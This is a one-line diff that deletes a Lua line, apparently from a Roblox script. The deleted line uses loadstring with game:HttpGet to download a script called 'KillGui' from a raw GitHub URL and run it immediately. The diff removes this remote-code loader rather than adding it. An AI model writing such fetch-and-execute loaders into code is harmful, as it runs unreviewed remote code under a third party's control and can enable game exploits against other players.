@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/fizzyscripting/Main/refs/heads/main/KillGui'))()
